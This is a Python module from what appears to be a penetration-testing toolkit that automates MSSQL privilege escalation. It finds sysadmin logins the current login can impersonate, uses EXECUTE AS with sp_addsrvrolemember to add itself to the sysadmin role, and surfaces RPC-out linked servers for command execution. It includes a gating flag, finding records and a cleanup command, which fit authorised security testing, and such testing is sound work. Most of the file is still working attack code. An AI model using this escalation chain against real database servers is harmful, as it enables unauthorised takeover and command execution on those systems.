"""MSSQL privilege escalation — a low-privileged SQL login to sysadmin.

`spray mssql` gives you a login; being *sysadmin* is what unlocks xp_cmdshell (see
:mod:`fieldkit.transport`). This module drives the SQL-layer escalation from a non-sysadmin
login to sysadmin, via the two standard paths:

  * **EXECUTE AS impersonation** — the login holds ``IMPERSONATE`` on a sysadmin login
    (commonly ``sa``); assume it and add your own login to the ``sysadmin`` role. This is
    auto-proven here (reversible: ``sp_dropsrvrolemember``), which genuinely upgrades your
    access so the normal ``enum``/``escalate`` xp_cmdshell chain then works;
  * **linked servers** — a link configured for RPC-out/data-access can run commands on the
    remote instance, often privileged. These are *enumerated and surfaced* (an operator
    drives the host-specific hop); auto-exploitation would need the remote in scope.

Queries prefix each result value with a ``FK:`` sentinel, so parsing is robust regardless
of how the driven tool formats its result table. The child-process runner is injected as
everywhere else, so this is testable with a fake ``nxc``.
"""
import re
from dataclasses import dataclass, field

from .creds import Credential

# ---- queries (FK: sentinel makes the result trivially parseable) -------------
_IS_SYSADMIN = "SELECT 'FK:'+CAST(IS_SRVROLEMEMBER('sysadmin') AS varchar(1))"
_WHOAMI = "SELECT 'FK:'+SUSER_NAME()"
_IMPERSONATE = ("SELECT 'FK:'+b.name FROM sys.server_permissions a "
                "JOIN sys.server_principals b ON a.grantor_principal_id=b.principal_id "
                "WHERE a.permission_name='IMPERSONATE'")
_LINKED = "SELECT 'FK:'+name FROM sys.servers WHERE is_linked=1 AND is_rpc_out_enabled=1"


def _as_login(login, inner):
    return f"EXECUTE AS LOGIN='{login}';{inner};REVERT"


def _query_argv(cred, ip, sql):
    from .creds import render_nxc
    return render_nxc(cred, "mssql", target=ip, extra=["-q", sql])


def _fk(output):
    """Every ``FK:<value>`` the driven query relayed, stripped."""
    return [m.strip() for m in re.findall(r"FK:(.*)", output or "")]


@dataclass
class MssqlReport:
    host: str
    status: str = "none"          # already_sysadmin|escalated|gated|linked_only|none|failed|aborted
    via: str = None               # the impersonated login, when escalated
    impersonatable: list = field(default_factory=list)   # sysadmin logins we can impersonate
    linked: list = field(default_factory=list)           # linked servers (rpc-out)
    aborted: str = None


def escalate_privs(store, host, cred, *, run=None, allow_config_change=False, on_event=None):
    """Enumerate the SQL-layer escalation surface and, when permitted, escalate to sysadmin.

    Reads-only unless ``allow_config_change`` (adding your login to the sysadmin role is a
    config change). Records a proven finding + captured step + a cleanup artifact and
    upgrades your MSSQL access to admin when it escalates."""
    from . import runner as runner_mod
    run = run or (lambda argv, env=None: runner_mod.run(argv, env_add=env))
    cred = cred if isinstance(cred, Credential) else Credential.from_row(cred)
    ip = host["ip"]
    rep = MssqlReport(host=ip)

    def query(sql):
        rendered = _query_argv(cred, ip, sql)
        res = run(rendered.argv, rendered.env)
        return res

    def emit(m):
        if on_event:
            on_event(m)

    # 1) already sysadmin? then there's nothing to escalate here.
    res = query(_IS_SYSADMIN)
    if res.error:
        rep.aborted = res.error
        return rep
    if "1" in _fk(res.output):
        rep.status = "already_sysadmin"
        return rep

    # 2) who am I, and which logins can I impersonate that are sysadmin?
    me = next(iter(_fk(query(_WHOAMI).output)), None) or cred.username
    for login in _fk(query(_IMPERSONATE).output):
        if "1" in _fk(query(_as_login(login, _IS_SYSADMIN)).output):
            rep.impersonatable.append(login)
            emit(f"  impersonatable sysadmin login: {login}")

    # 3) linked servers (surfaced, not auto-exploited)
    rep.linked = _fk(query(_LINKED).output)
    for s in rep.linked:
        emit(f"  linked server (rpc-out): {s}")

    if not rep.impersonatable:
        rep.status = "linked_only" if rep.linked else "none"
        _record_linked(store, host, rep)
        return rep

    if not allow_config_change:
        rep.status = "gated"
        _record_linked(store, host, rep)
        return rep

    # 4) escalate: impersonate the sysadmin login and add my own login to the sysadmin role.
    login = rep.impersonatable[0]
    grant = _as_login(login, f"EXEC sp_addsrvrolemember '{me}','sysadmin'")
    emit(f"  escalating: EXECUTE AS {login} → add {me} to sysadmin")
    query(grant)
    verify = query(_IS_SYSADMIN)
    if "1" not in _fk(verify.output):
        rep.status = "failed"
        return rep

    rep.status = "escalated"
    rep.via = login
    drop = _as_login(login, f"EXEC sp_dropsrvrolemember '{me}','sysadmin'")
    with store.transaction():
        fid, _ = store.add_finding(
            "mssql_impersonation",
            f"MSSQL EXECUTE AS impersonation ({login}) → sysadmin", host_id=host["id"],
            proven=True,
            evidence=f"{me} holds IMPERSONATE on sysadmin login {login}; added {me} to the "
                     "sysadmin role (verified IS_SRVROLEMEMBER('sysadmin')=1).")
        step_id = store.add_step(
            cmd=f"nxc mssql {ip} ... -q \"{grant}\"", output=verify.output or "FK:1",
            host_id=host["id"], finding_id=fid, transport="mssql")
        _ = step_id
        # you are now genuinely sysadmin — the plain xp_cmdshell path works.
        store.add_access(host["id"], _cred_id(store, cred), "mssql", admin=True)
        store.add_artifact(
            f"added {me} to the MSSQL sysadmin role on {ip}",
            cleanup_cmd=f"nxc mssql {ip} ... -q \"{drop}\"",
            host_id=host["id"], finding_id=fid)
    _record_linked(store, host, rep)
    return rep


def _record_linked(store, host, rep):
    """Linked servers are observations — enumerated, not exploited."""
    if not rep.linked:
        return
    with store.transaction():
        store.add_finding(
            "mssql_linked_server",
            f"MSSQL linked server(s) with RPC-out: {', '.join(rep.linked)}",
            host_id=host["id"],
            evidence="rpc-out linked servers reachable from this instance: "
                     + ", ".join(rep.linked)
                     + ". `EXEC ('…') AT [<server>]` runs on the remote instance.")


def _cred_id(store, cred):
    # add_credential dedupes, so this returns the existing row's id.
    cid, _ = store.add_credential(cred)
    return cid
